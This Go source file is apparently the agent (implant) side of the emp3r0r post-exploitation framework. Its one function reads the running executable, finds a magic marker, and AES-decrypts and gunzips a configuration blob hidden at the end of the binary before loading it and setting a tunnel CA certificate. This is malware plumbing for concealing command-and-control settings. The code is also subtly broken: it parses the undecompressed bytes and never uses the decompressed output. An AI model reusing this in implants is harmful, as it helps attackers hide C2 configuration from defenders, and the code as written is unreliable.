package agent

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/mholt/archiver"
)

var RuntimeConfig = &emp3r0r_data.Config{}

func ApplyRuntimeConfig() (err error) {
	wholeStub, err := ioutil.ReadFile(os.Args[0])
	if err != nil {
		return
	}

	// locate the JSON file
	jsonBegining := bytes.LastIndex(wholeStub, []byte(RuntimeConfig.MagicString))
	jsonBytes := wholeStub[(jsonBegining + len(RuntimeConfig.MagicString)):]

	// decrypt attached JSON file
	key := tun.GenAESKey(RuntimeConfig.MagicString)
	jsonData := tun.AESDecryptRaw(key, jsonBytes)
	if jsonData == nil {
		err = fmt.Errorf("Decrypt JSON failed")
		return
	}

	// decompress
	var decompressedBytes []byte
	gz := &archiver.Gz{CompressionLevel: 9}
	r := bytes.NewReader(jsonData)
	w := bytes.NewBuffer(decompressedBytes)
	err = gz.Decompress(r, w)
	if err != nil {
		err = fmt.Errorf("Decompress JSON: %v", err)
		return
	}

	// parse JSON
	err = emp3r0r_data.ReadJSONConfig(jsonData, RuntimeConfig)
	if err != nil {
		return fmt.Errorf("parsing JSON data (%s): %v", jsonData, err)
	}

	// CA
	tun.CACrt = []byte(RuntimeConfig.CA)
	return
}
